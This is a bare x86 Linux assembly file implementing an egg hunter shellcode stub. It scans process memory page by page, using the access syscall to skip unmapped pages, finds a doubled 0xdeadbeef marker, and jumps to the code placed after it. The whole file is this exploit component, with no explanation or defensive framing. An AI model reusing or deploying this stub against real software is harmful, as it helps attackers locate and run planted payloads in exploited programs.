global _start 

section .text 


_start: 
	xor eax, eax
;	xor 
	xor ecx, ecx
	mul ecx
	mov esi, 0xdeadbeef

next_page:
	or dx, 0xfff

next_byte:
	inc edx
	xor eax, eax
	mov al, 0x21
	
	lea ebx, [edx+8]
	int 0x80
	cmp al,0xf2
	jnz next_page
	cmp [edx], esi
	jnz next_byte
	cmp [edx+4], esi
	jnz next_byte
	lea esi, [edx + 8]
	jmp esi
